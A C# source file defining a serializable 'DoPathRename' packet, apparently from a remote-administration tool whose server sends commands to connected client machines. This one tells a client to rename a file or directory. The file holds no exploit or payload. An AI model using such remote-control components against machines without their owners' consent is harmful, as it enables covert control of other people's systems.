using System;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.Enumlar2;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoPathRename : IPacket
    {
        public string Path { get; set; }

        public string NewPath { get; set; }

        public DizinTürleri DizinTürleri { get; set; }

        public DoPathRename()
        {
        }

        public DoPathRename(string path, string newpath, DizinTürleri pathtype)
        {
            this.Path = path;
            this.NewPath = newpath;
            this.DizinTürleri = pathtype;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}